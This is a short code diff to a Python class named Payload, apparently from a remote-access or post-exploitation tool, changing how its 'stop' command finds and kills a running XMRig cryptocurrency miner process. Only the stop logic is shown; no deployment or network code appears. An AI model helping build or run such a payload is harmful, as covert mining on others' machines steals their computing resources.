@@ -602,8 +602,9 @@ class Payload():
             return result
 
         elif 'stop' in args:
-            if self.xmrig_path in self.execute.process_list:
-                self.execute.process_list[self.xmrig_path].kill()
+            name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
+            if name in self.execute.process_list:
+                self.execute.process_list[name].kill()
                 return "Miner stopped."
             else:
                 return "Miner is not running."
